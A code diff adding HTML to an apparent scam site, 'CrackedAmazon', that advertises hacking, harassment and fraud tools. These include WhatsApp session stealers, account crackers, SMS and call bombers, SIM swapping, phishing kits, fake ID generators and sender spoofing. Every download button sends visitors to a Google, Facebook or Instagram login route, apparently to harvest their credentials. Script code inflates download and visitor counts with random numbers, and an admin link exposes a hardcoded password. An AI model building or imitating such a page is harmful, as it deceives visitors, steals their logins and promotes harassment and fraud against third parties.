+                <span class="tool-icon">💬</span>
+            </div>
+            <div class="tool-title">WhatsApp Web Session Stealer</div>
+            <span class="tool-category">Social</span>
+            <div class="tool-description">Read anyone's WhatsApp chats remotely. Session hijacking tool.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐ (3.7k)</span>
+                <span class="tool-downloads">📥 2.3k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=whatsapp'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=whatsapp'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=whatsapp'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=whatsapp'">Download Now</button>
+        </div>
+        
+        <!-- TikTok Account Cracker -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">🎵</span>
+            </div>
+            <div class="tool-title">TikTok Account Cracker</div>
+            <span class="tool-category">Social</span>
+            <div class="tool-description">Bypass phone verification. Get any TikTok password.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐ (2.8k)</span>
+                <span class="tool-downloads">📥 1.9k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=tiktok'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=tiktok'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=tiktok'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=tiktok'">Download Now</button>
+        </div>
+        
+        <!-- Snapchat My Eyes Only Breaker -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">👻</span>
+            </div>
+            <div class="tool-title">Snapchat My Eyes Only Breaker</div>
+            <span class="tool-category">Social</span>
+            <div class="tool-description">View private snaps and My Eyes Only folder.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐ (2.1k)</span>
+                <span class="tool-downloads">📥 1.6k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=snapchat'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=snapchat'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=snapchat'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=snapchat'">Download Now</button>
+        </div>
+        
+        <!-- Twitter/X Account Hacker -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">🐦</span>
+            </div>
+            <div class="tool-title">Twitter/X Account Hacker</div>
+            <span class="tool-category">Social</span>
+            <div class="tool-description">Takeover any Twitter account. Bypass email verification.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐ (1.9k)</span>
+                <span class="tool-downloads">📥 1.4k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=twitter'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=twitter'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=twitter'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=twitter'">Download Now</button>
+        </div>
+        
+        <!-- LinkedIn Account Cracker -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">💼</span>
+            </div>
+            <div class="tool-title">LinkedIn Account Cracker</div>
+            <span class="tool-category">Social</span>
+            <div class="tool-description">Access any LinkedIn account. View private profiles.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐ (1.5k)</span>
+                <span class="tool-downloads">📥 1.1k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=linkedin'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=linkedin'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=linkedin'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=linkedin'">Download Now</button>
         </div>
     </div>
-    
-    <div class="footer">
-        <p>⚡ CrackedAmazon • 50,000+ members • Since 2023</p>
-        <p style="margin-top: 10px;">All tools require Facebook verification</p>
+
+    <!-- ============================================
+         4. SMS & PHONE TOOLS (6 tools)
+    ============================================ -->
+    <div class="category-title">
+        <span class="category-name">
+            <span>📱</span> SMS & Phone Tools
+        </span>
+        <span class="category-count">6 tools</span>
     </div>
     
+    <div class="tools-grid">
+        <!-- USA Phone Generator Pro -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">🇺🇸</span>
+            </div>
+            <div class="tool-title">USA Phone Generator Pro</div>
+            <span class="tool-category">Numbers</span>
+            <div class="tool-description">Real USA numbers for verification. Receive SMS online. All states available.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐ (2.1k)</span>
+                <span class="tool-downloads">📥 3.1k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=usa-numbers'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=usa-numbers'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=usa-numbers'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=usa-numbers'">Download Now</button>
+        </div>
+        
+        <!-- UK Number Generator -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">🇬🇧</span>
+            </div>
+            <div class="tool-title">UK Number Generator</div>
+            <span class="tool-category">Numbers</span>
+            <div class="tool-description">Real UK mobile numbers. Receive SMS for verifications.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐ (1.8k)</span>
+                <span class="tool-downloads">📥 2.2k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=uk-numbers'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=uk-numbers'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=uk-numbers'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=uk-numbers'">Download Now</button>
+        </div>
+        
+        <!-- SMS Bomber Pro -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">💣</span>
+            </div>
+            <div class="tool-title">SMS Bomber Pro</div>
+            <span class="tool-category">Harassment</span>
+            <div class="tool-description">Blast 5000 SMS per minute. Anonymous and untraceable. Works worldwide.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐⭐ (6.7k)</span>
+                <span class="tool-downloads">📥 5.2k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=sms-bomber'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=sms-bomber'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=sms-bomber'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=sms-bomber'">Download Now</button>
+        </div>
+        
+        <!-- Call Bomber Deluxe -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">📞</span>
+            </div>
+            <div class="tool-title">Call Bomber Deluxe</div>
+            <span class="tool-category">Harassment</span>
+            <div class="tool-description">Robocall anyone 24/7. 1000 calls per hour. Anonymous caller ID.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐ (4.2k)</span>
+                <span class="tool-downloads">📥 3.1k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=call-bomber'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=call-bomber'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=call-bomber'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=call-bomber'">Download Now</button>
+        </div>
+        
+        <!-- SIM Swap Tool -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">🔄</span>
+            </div>
+            <div class="tool-title">SIM Swap Tool</div>
+            <span class="tool-category">Phone</span>
+            <div class="tool-description">Take over any phone number. Works on MTN, Glo, Airtel, 9mobile.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐ (2.5k)</span>
+                <span class="tool-downloads">📥 1.8k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=sim-swap'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=sim-swap'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=sim-swap'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=sim-swap'">Download Now</button>
+        </div>
+        
+        <!-- Temp Number Rental -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">📲</span>
+            </div>
+            <div class="tool-title">Temp Number Rental</div>
+            <span class="tool-category">Numbers</span>
+            <div class="tool-description">Rent temporary numbers for OTP verification. USA, UK, Canada.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐ (1.9k)</span>
+                <span class="tool-downloads">📥 1.5k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=temp-numbers'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=temp-numbers'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=temp-numbers'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=temp-numbers'">Download Now</button>
+        </div>
+    </div>
+
+    <!-- ============================================
+         5. PHISHING & SCAM KITS (5 tools)
+    ============================================ -->
+    <div class="category-title">
+        <span class="category-name">
+            <span>🎣</span> Phishing & Scam Kits
+        </span>
+        <span class="category-count">5 tools</span>
+    </div>
+    
+    <div class="tools-grid">
+        <!-- 100+ Phishing Templates -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">🎣</span>
+            </div>
+            <div class="tool-title">100+ Phishing Templates</div>
+            <span class="tool-category">Scam</span>
+            <div class="tool-description">Bank, Gmail, Facebook, PayPal clones. Ready to deploy. 2025 updated.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐⭐ (7.2k)</span>
+                <span class="tool-downloads">📥 4.1k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=phish-templates'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=phish-templates'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=phish-templates'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=phish-templates'">Download Now</button>
+        </div>
+        
+        <!-- Fake ID Generator Pro -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">🆔</span>
+            </div>
+            <div class="tool-title">Fake ID Generator Pro</div>
+            <span class="tool-category">Scam</span>
+            <div class="tool-description">Passports, driver's licenses, NIN, Voter's card, PVC. Realistic templates.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐⭐ (5.4k)</span>
+                <span class="tool-downloads">📥 3.8k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=fake-id'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=fake-id'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=fake-id'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=fake-id'">Download Now</button>
+        </div>
+        
+        <!-- SMS Spoofing Kit -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">📨</span>
+            </div>
+            <div class="tool-title">SMS Spoofing Kit</div>
+            <span class="tool-category">Scam</span>
+            <div class="tool-description">Send SMS as any sender. Bank, delivery, government. Undetectable.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐ (3.9k)</span>
+                <span class="tool-downloads">📥 2.2k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=sms-spoofer'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=sms-spoofer'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=sms-spoofer'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=sms-spoofer'">Download Now</button>
+        </div>
+        
+        <!-- Fake Email Sender -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">✉️</span>
+            </div>
+            <div class="tool-title">Fake Email Sender</div>
+            <span class="tool-category">Scam</span>
+            <div class="tool-description">Send emails as any company. Amazon, PayPal, banks. Spoof any sender.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐ (4.3k)</span>
+                <span class="tool-downloads">📥 2.7k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=fake-email'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=fake-email'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=fake-email'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=fake-email'">Download Now</button>
+        </div>
+        
+        <!-- WhatsApp Phishing Kit -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">💬</span>
+            </div>
+            <div class="tool-title">WhatsApp Phishing Kit</div>
+            <span class="tool-category">Scam</span>
+            <div class="tool-description">Clone WhatsApp Web login page. Capture QR code sessions.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐ (3.1k)</span>
+                <span class="tool-downloads">📥 2.4k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=whatsapp-phish'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=whatsapp-phish'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=whatsapp-phish'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=whatsapp-phish'">Download Now</button>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#">About Us</a>
+            <a href="#">Telegram Channel</a>
+            <a href="#">WhatsApp Group</a>
+            <a href="#">Support</a>
+            <a href="#">Terms</a>
+        </div>
+        <div class="copyright">
+            ⚡ CrackedAmazon • 35+ Premium Tools • 50,000+ Members • Since 2023
+        </div>
+    </div>
+
+    <!-- Admin Link -->
+    <a href="/admin?pass=Daniel" class="admin-link">⚡ Admin</a>
+
     <script>
+        // Search functionality
         document.getElementById('searchInput').addEventListener('input', function(e) {
-            const term = e.target.value.toLowerCase();
-            document.querySelectorAll('.tool-card').forEach(card => {
+            const searchTerm = e.target.value.toLowerCase();
+            const toolCards = document.querySelectorAll('.tool-card');
+            
+            toolCards.forEach(card => {
                 const text = card.textContent.toLowerCase();
-                card.style.display = text.includes(term) ? 'block' : 'none';
+                if (text.includes(searchTerm) || searchTerm === '') {
+                    card.style.display = 'block';
+                } else {
+                    card.style.display = 'none';
+                }
             });
         });
-        
+
+        // Update download counters randomly
         setInterval(() => {
-            document.querySelectorAll('.live-count').forEach(el => {
-                const current = parseInt(el.textContent.match(/\d+/)?.[0] || '200');
-                el.innerHTML = `⚡ ${current + Math.floor(Math.random() * 3)} downloading now`;
+            document.querySelectorAll('.tool-downloads').forEach(el => {
+                const text = el.textContent;
+                const match = text.match(/\d+(\.\d+)?k?/);
+                if (match) {
+                    let num = match[0];
+                    let isK = num.includes('k');
+                    let value = parseFloat(num) * (isK ? 1000 : 1);
+                    value += Math.floor(Math.random() * 50) + 10;
+                    if (isK) {
+                        el.textContent = '📥 ' + (value/1000).toFixed(1) + 'k today';
+                    } else {
+                        el.textContent = '📥 ' + value + ' today';
+                    }
+                }
             });
-        }, 10000);
+        }, 30000);
+
+        // Simple visitor counter (just for show)
+        const visitorCount = localStorage.getItem('visitorCount') || Math.floor(Math.random() * 1000) + 40000;
+        localStorage.setItem('visitorCount', parseInt(visitorCount) + 1);
     </script>
 </body>
 </html>
